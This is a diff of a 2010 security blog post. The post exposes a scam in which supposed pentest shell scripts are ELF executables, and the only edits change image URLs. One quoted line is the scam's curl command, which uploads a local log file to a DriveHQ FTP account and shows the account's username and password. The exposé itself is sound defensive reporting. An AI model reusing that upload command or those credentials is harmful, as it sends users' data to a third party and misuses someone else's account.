@@ -11,7 +11,7 @@ It did not take too long, and with the accidental help of <a href="http://techcr
 
 Yes, I know, the design is horrible, the scrolling thing on the top of the page is just missing a &lt;blink&gt; tag to drive you into an epileptic seizure, and the music, well, itâ€™s music as part of a website - welcome to the 80â€™s.
 
-<img class="alignright size-full wp-image-485" title="used-by-fbi" src="http://www.iamit.org/blog/assets/uploads/2010/07/used-by-fbi.png" alt="" width="188" height="176" />Not being deterred by the horrible design, I went ahead and downloaded the â€œtoolsâ€ offered in the article. After all, the FBI are using this guyâ€™s tools...
+<img class="alignright size-full wp-image-485" title="used-by-fbi" src="http://www.iamit.org/assets/uploads/2010/07/used-by-fbi.png" alt="" width="188" height="176" />Not being deterred by the horrible design, I went ahead and downloaded the â€œtoolsâ€ offered in the article. After all, the FBI are using this guyâ€™s tools...
 A quick look, and I was faced with three supposed shell scripts (ended with a .sh), and a tarball called â€œrogue.tar.gzâ€.
 When you get a shellscript that isnâ€™t a shellscript, and is being reported as an â€œELFâ€ executable, you should get your detective hat on, which is exactly what I did.
 It didnâ€™t take long, and the scam unfolded pretty quickly. Hereâ€™s a quick recap of whatâ€™s going on with this guyâ€™s website:
@@ -176,7 +176,7 @@ But wait, thereâ€™s more!!! more? how come? well, just to put some icing on
 <blockquote>curl -s -k --ftp-ssl -T /pentest/log.txt -u fadzilmahfodh:buaya ftp://ftp.drivehq.com/code$number.txt</blockquote>
 Just to see the final lameness come to life as I tested the account:
 
-<a href="http://www.iamit.org/blog/assets/uploads/2010/07/wpid-ftpfail-2010-07-8-09-48.png"><img src="http://www.iamit.org/blog/assets/uploads/2010/07/wpid-ftpfail-2010-07-8-09-48.png" alt="wpid-ftpfail-2010-07-8-09-48.png" width="514" height="178" /></a>
+<a href="http://www.iamit.org/assets/uploads/2010/07/wpid-ftpfail-2010-07-8-09-48.png"><img src="http://www.iamit.org/assets/uploads/2010/07/wpid-ftpfail-2010-07-8-09-48.png" alt="wpid-ftpfail-2010-07-8-09-48.png" width="514" height="178" /></a>
 
 And you know what - itâ€™s all our fault! If we as a community would have â€œdonatedâ€ to this guy for all his hard work and effort that heâ€™s been putting in creating tools that are used by the FBI (check out his site...), he would have had the money to keep his driveHQ account in order and could make a decent living out of ripping people off.
 
